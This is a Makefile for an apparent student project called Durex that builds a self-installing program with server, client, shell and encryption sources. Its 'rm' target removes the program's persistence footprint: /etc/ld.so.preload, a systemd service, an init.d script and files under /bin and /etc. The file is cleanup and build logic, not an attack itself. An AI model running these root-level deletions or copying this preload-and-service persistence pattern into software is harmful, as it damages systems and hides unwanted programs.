#******************************************************************************#
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: root </var/mail/root>                      +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2018/01/12 20:15:31 by root              #+#    #+#              #
#    Updated: 2018/08/21 06:19:10 by root             ###   ########.fr        #
#                                                                              #
#******************************************************************************#

NAME	= Durex
SRC		= main.c install.c durex.c server.c client.c encrypt.c commands.c
SRC		+= signal.c move.c reporter.c stdlib.c library.c
OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
DEP		= $(addprefix $(DEP_DIR), $(SRC:.c=.d))
SRC_DIR	= srcs/
HDR_DIR = -I includes/
OBJ_DIR	= objs/
DEP_DIR = .deps/
LIB_DIR	= libft/
FLAGS	= -Wall -Werror -Wextra

all: $(OBJ_DIR) $(NAME)

$(OBJ_DIR):
	mkdir -p $@
	mkdir -p $(DEP_DIR)

$(NAME): $(OBJ)
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -D_XOPEN_SOURCE=600 -o $(OBJ_DIR)shell.o -c $(SRC_DIR)shell.c $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@
	$(CC) -o $@ $^ $(OBJ_DIR)shell.o $(LIBS)

$(OBJ_DIR)%.o: $(SRC_DIR)%.c
$(OBJ_DIR)%.o: $(SRC_DIR)%.c $(DEP_DIR)%.d
	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@

$(DEP_DIR)%.d: ;
.PRECIOUS: $@

-include $(DEP)

clean:
	/bin/rm -rf $(OBJ_DIR)
	/bin/rm -rf $(DEP_DIR)

fclean: clean
	/bin/rm -f $(NAME)

re: fclean all

rm:
	rm /etc/ld.so.preload
	systemctl stop $(NAME)
	systemctl disable $(NAME)
	rm /bin/Durex
	rm /etc/init.d/Durex
	rm /lib/systemd/system/Durex.service
	rm /etc/systemd/Durex.conf
	rm /var/log/Durex.log

passwd:
	$(CC) -o pass other/passwd.c
hex:
	$(CC) -o hex other/txttohex.c
